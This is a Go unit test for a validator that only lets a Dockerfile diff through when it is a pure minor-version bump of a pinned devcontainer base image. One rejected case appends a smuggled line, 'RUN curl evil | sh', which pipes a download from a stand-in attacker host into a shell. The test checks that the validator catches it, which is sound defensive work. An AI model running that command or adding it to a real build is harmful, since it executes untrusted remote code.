package bump

import (
	"strconv"
	"testing"

	"github.com/603-identity/devcontainers/tools/devc-verify/internal/check"
	"github.com/603-identity/devcontainers/tools/devc-verify/internal/image"
)

const (
	d1 = "sha256:1111111111111111111111111111111111111111111111111111111111111111"
	d2 = "sha256:2222222222222222222222222222222222222222222222222222222222222222"
)

func from(name string, major, minor int, d string) string {
	return "ghcr.io/603-identity/devcontainer-" + name + ":" + strconv.Itoa(major) + "." + strconv.Itoa(minor) + "@" + d
}

func patch(removed, added string) string {
	return "@@ -17,7 +17,7 @@ # context\n # comment\n #\n-FROM " + removed + "\n+FROM " + added + "\n \n USER 1000:1000\n"
}

func TestPredicate(t *testing.T) {
	old := from("tofu", 4, 100, d1)
	cases := []struct {
		name  string
		patch string
		newer string
		ok    bool
	}{
		{"greater minor", patch(old, from("tofu", 4, 101, d2)), from("tofu", 4, 101, d2), true},
		{"much greater minor, numeric not lexical", patch(from("tofu", 4, 99, d1), from("tofu", 4, 100, d2)), from("tofu", 4, 100, d2), true},
		{"no newline marker", "@@ -1 +1 @@\n-FROM " + old + "\n+FROM " + from("tofu", 4, 101, d2) + "\n\\ No newline at end of file\n", from("tofu", 4, 101, d2), true},
		{"MAJOR bump", patch(old, from("tofu", 5, 101, d2)), from("tofu", 5, 101, d2), false},
		{"downgrade", patch(old, from("tofu", 4, 99, d2)), from("tofu", 4, 99, d2), false},
		{"equal minor", patch(old, from("tofu", 4, 100, d2)), from("tofu", 4, 100, d2), false},
		{"different image", patch(old, from("node", 4, 101, d2)), from("node", 4, 101, d2), false},
		{"platform flag", patch(old, "--platform=linux/amd64 "+from("tofu", 4, 101, d2)), from("tofu", 4, 101, d2), false},
		{"AS name", patch(old, from("tofu", 4, 101, d2)+" AS evil"), from("tofu", 4, 101, d2), false},
		{"removed side AS name", patch(old+" AS evil", from("tofu", 4, 101, d2)), from("tofu", 4, 101, d2), false},
		{"lowercase from", "@@ -1 +1 @@\n-FROM " + old + "\n+from " + from("tofu", 4, 101, d2) + "\n", from("tofu", 4, 101, d2), false},
		{"extra added line", patch(old, from("tofu", 4, 101, d2)) + "+RUN curl evil | sh\n", from("tofu", 4, 101, d2), false},
		{"extra removed line", patch(old, from("tofu", 4, 101, d2)) + "-USER 1000:1000\n", from("tofu", 4, 101, d2), false},
		{"only an addition", "@@ -1 +1,2 @@\n+FROM " + from("tofu", 4, 101, d2) + "\n", from("tofu", 4, 101, d2), false},
		{"empty patch", "", from("tofu", 4, 101, d2), false},
		{"non-FROM line changed", "@@ -1 +1 @@\n-USER root\n+USER 1000\n", from("tofu", 4, 101, d2), false},
		{"head file disagrees with the patch", patch(old, from("tofu", 4, 101, d2)), from("tofu", 4, 102, d2), false},
		{"garbage line", patch(old, from("tofu", 4, 101, d2)) + "!oops\n", from("tofu", 4, 101, d2), false},
		{"CR in the line", "@@ -1 +1 @@\n-FROM " + old + "\n+FROM " + from("tofu", 4, 101, d2) + "\r\n", from("tofu", 4, 101, d2), false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			nb, err := image.Parse(c.newer)
			if err != nil {
				t.Fatal(err)
			}
			err = Predicate(c.patch, nb)
			switch {
			case c.ok && err != nil:
				t.Fatalf("want ok, got %v", err)
			case !c.ok && !check.IsFailure(err):
				t.Fatalf("want a check failure, got %v", err)
			}
		})
	}
}
